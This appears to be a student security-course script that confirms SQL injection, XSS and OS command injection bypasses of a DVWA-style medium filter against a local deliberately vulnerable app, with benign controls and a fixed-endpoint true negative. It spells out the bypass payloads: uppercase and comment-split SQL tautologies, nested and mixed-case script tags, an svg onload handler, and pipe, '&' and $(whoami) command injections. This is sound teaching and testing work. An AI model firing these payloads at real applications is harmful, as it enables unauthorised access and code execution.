# HW2 — Web Attack & Defend — Part A (Attack) — Team: Gabriel Avalos, Keoma Quiroga, David Bucheli
"""Part A — confirm THREE vulnerability classes (SQLi, XSS, cmdi), each THROUGH a
Medium-filter bypass, each confirmed by a SOUND ORACLE.

Discipline (scorecard axis 3): a finding is NOT "the page looked different." It is
"a sound oracle confirmed a security-relevant effect, reproducibly." So for each
class we:

  1. send a canonical BASELINE payload THROUGH the Medium filter (common/medium_filter)
     and show the oracle does NOT confirm — proof the filter really neutralises the
     obvious attack, so a bypass was necessary (not a strawman filter);
  2. send >=3 BYPASSES (case / inline-comment / alternate-vector) through the SAME
     filter and confirm each with the oracle on the real sink;
  3. run a BENIGN control per class that the filter passes and the oracle must NOT
     confirm — a false positive in our own tooling would poison every downstream number;
  4. for XSS, also fire the bypass at the FIXED /safe endpoint as a TRUE NEGATIVE.

Every payload is fired trials=3; a finding reports successes/trials so a flaky
confirmation cannot masquerade as a reliable exploit.

Run:  python attack/attack.py      (writes results/attack_findings.csv + .json)
"""
from __future__ import annotations

import csv
import json
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
from common import app_harness as H          # noqa: E402
from common import medium_filter as MF        # noqa: E402

from seclab.attack import Payload, run_payloads  # noqa: E402

HERE = Path(__file__).resolve().parent
TRIALS = 3

PLAN = {
    "sqli": {
        "owasp": "A03:2021 – Injection",
        "sink": "POST /login (do_login) — string-formatted SQL",
        "payloads": [
            dict(text="admin' or '1'='1", role="baseline", note="",
                 technique="canonical tautology (lowercase) — blocklisted by Medium"),
            dict(text="admin' OR '1'='1", role="bypass", note="",
                 technique="CASE: uppercase OR evades the case-sensitive blocklist"),
            dict(text="admin'/**/Or/**/'1'='1", role="bypass", note="",
                 technique="COMMENT+CASE: /**/ splits tokens, mixed-case Or"),
            dict(text="admin'/**/-- -", role="bypass", note="",
                 technique="COMMENT: inline comment terminates the pw check"),
        ],
    },
    "xss": {
        "owasp": "A03:2021 – Injection (Cross-Site Scripting)",
        "sink": "GET /?name= (do_reflect) — unescaped into HTML",
        "payloads": [
            dict(text="<script>alert('XSS-7f3a')</script>", role="baseline",
                 note="<script>", technique="canonical <script> (removed by str_replace)"),
            dict(text="<ScRiPt>alert('XSS-7f3a')</ScRiPt>", role="bypass",
                 note="<ScRiPt>", technique="CASE: mixed-case tag evades case-sensitive str_replace"),
            dict(text="<scr<script>ipt>alert('XSS-7f3a')</script>", role="bypass",
                 note="<script>", technique="NESTED: single-pass removal reconstitutes <script>"),
            dict(text="<svg onload=alert('XSS-7f3a')>", role="bypass",
                 note="<svg onload=", technique="ALT-VECTOR: event handler, no <script> token"),
        ],
    },
    "cmdi": {
        "owasp": "A03:2021 – Injection (OS Command Injection)",
        "sink": "POST /ping (do_ping) — host concatenated into a command",
        "payloads": [
            dict(text="127.0.0.1; whoami", role="baseline", note="",
                 technique="canonical ';' separator (stripped by Medium)"),
            dict(text="127.0.0.1 | whoami", role="bypass", note="",
                 technique="pipe '|' — not in the {; &&} strip set"),
            dict(text="127.0.0.1 & whoami", role="bypass", note="",
                 technique="single '&' — filter strips only '&&'"),
            dict(text="127.0.0.1 $(whoami)", role="bypass", note="",
                 technique="command substitution $( ) — survives entirely"),
        ],
    },
}

BENIGN = {
    "sqli": dict(text="alice", note="", why="a real username, wrong password"),
    "xss": dict(text="Keoma O'Brien", note="no-such-marker", why="legit name with an apostrophe"),
    "cmdi": dict(text="api.internal.example", note="", why="a plain hostname, no metacharacters"),
}


def run_class(kind: str, spec: dict) -> list[dict]:
    send = H.make_send(kind, defense=MF)        # Medium filter IN FRONT of the sink
    oracle = H.ORACLES[kind]()
    payloads = [Payload(text=p["text"], family=kind, intent=p["role"], note=p["note"])
                for p in spec["payloads"]]
    findings = run_payloads(payloads, send=send, oracle=oracle, trials=TRIALS)
    rows = []
    for meta, f in zip(spec["payloads"], findings):
        rows.append({
            "class": kind, "owasp": spec["owasp"], "sink": spec["sink"],
            "payload": meta["text"], "role": meta["role"], "technique": meta["technique"],
            "confirmed": f.confirmed, "successes_trials": f"{f.successes}/{f.trials}",
            "evidence": f.evidence or "(no effect — filter neutralised it)",
        })
    # benign control (passes the filter, oracle must stay silent)
    b = BENIGN[kind]
    bf = run_payloads([Payload(text=b["text"], family="benign", note=b["note"])],
                      send=send, oracle=oracle, trials=TRIALS)[0]
    rows.append({
        "class": f"{kind}-benign-control", "owasp": spec["owasp"], "sink": spec["sink"],
        "payload": b["text"], "role": "benign", "technique": b["why"],
        "confirmed": bf.confirmed, "successes_trials": f"{bf.successes}/{bf.trials}",
        "evidence": bf.evidence or "no effect (correct)",
    })
    return rows


def xss_true_negative() -> dict:
    # Same alt-vector bypass at the FIXED /safe endpoint must NOT confirm.
    send = H.make_send("xss", defense=MF, fixed=True)
    p = Payload(text="<svg onload=alert('XSS-7f3a')>", family="xss", note="<svg onload=")
    f = run_payloads([p], send=send, oracle=H.xss_oracle(), trials=TRIALS)[0]
    return {
        "class": "xss-true-negative(/safe)", "owasp": "A03:2021 – Injection",
        "sink": "GET /safe (do_reflect_safe) — html.escape", "payload": p.text,
        "role": "true-negative", "technique": "same bypass, fixed endpoint",
        "confirmed": f.confirmed, "successes_trials": f"{f.successes}/{f.trials}",
        "evidence": f.evidence or "escaped by html.escape (correct)",
    }


def broken_access_control_note() -> str:
    return (
        "A01:2021 Broken Access Control is NOT reachable in vuln-web: the app has no "
        "sessions, roles, object ownership or authorization checks of any kind — there "
        "is no access-control logic to break. The SQLi auth-bypass lets an attacker "
        "read the admin row, but that is a confidentiality failure via Injection (A03), "
        "not a broken access-control decision (A01): the authentication bypass is a "
        "CONSEQUENCE of the injection, not evidence of a broken access-control layer. "
        "Demonstrating a real A01 finding would need an endpoint that CHECKS a role or "
        "owner and does it wrong; a single-file app with no such check cannot manufacture "
        "one. This matches duel-2-web/ground_truth.json's explicit 'not_present: "
        "broken-access-control' and the week-6 lesson that #1 needs app semantics, not "
        "a payload — the exact point Part C makes the LLM fail on."
    )


def main() -> int:
    all_rows, summary = [], {}
    for kind, spec in PLAN.items():
        rows = run_class(kind, spec)
        all_rows.extend(rows)
        confirmed_bypasses = [r for r in rows if r["role"] == "bypass" and r["confirmed"]]
        baseline = next(r for r in rows if r["role"] == "baseline")
        summary[kind] = {
            "owasp": spec["owasp"], "sink": spec["sink"],
            "baseline_neutralised_by_filter": not baseline["confirmed"],
            "confirmed_bypasses": len(confirmed_bypasses),
            "example_bypass": confirmed_bypasses[0]["payload"] if confirmed_bypasses else None,
        }
    tn = xss_true_negative()
    all_rows.append(tn)

    csv_path = HERE / "results" / "attack_findings.csv"
    csv_path.parent.mkdir(parents=True, exist_ok=True)
    with csv_path.open("w", newline="", encoding="utf-8") as fh:
        w = csv.DictWriter(fh, fieldnames=list(all_rows[0].keys()))
        w.writeheader()
        w.writerows(all_rows)

    out = {
        "target": "vuln-web (labs/vuln-web/app/vulnweb_app.py), in-process on 127.0.0.1",
        "filter_level": "Medium (DVWA-style built-in filter, common/medium_filter.py), "
                        "fired IN FRONT of every sink so each bypass had to defeat it",
        "oracle_trials_each": TRIALS,
        "classes": summary,
        "xss_true_negative_safe_confirmed": tn["confirmed"],
        "broken_access_control": broken_access_control_note(),
        "rows": all_rows,
    }
    (HERE / "results" / "attack_findings.json").write_text(json.dumps(out, indent=2),
                                                           encoding="utf-8")

    print(f"PART A — attack at Medium ({TRIALS} trials/payload, oracle-confirmed)\n")
    for kind, s in summary.items():
        print(f"  {kind.upper():5} {s['owasp']}")
        print(f"        baseline neutralised by filter : {s['baseline_neutralised_by_filter']}")
        print(f"        confirmed bypasses             : {s['confirmed_bypasses']}  "
              f"e.g. {s['example_bypass']!r}")
    print(f"  XSS   /safe true-negative confirmed? {tn['confirmed']}  (must be False)")
    confirmed_classes = sum(1 for s in summary.values() if s["confirmed_bypasses"] >= 3)
    print(f"\n  wrote results/attack_findings.csv + .json")
    print(f"  {confirmed_classes}/3 classes with >=3 oracle-confirmed bypasses at Medium.")
    ok = confirmed_classes == 3 and not tn["confirmed"]
    return 0 if ok else 1


if __name__ == "__main__":
    raise SystemExit(main())
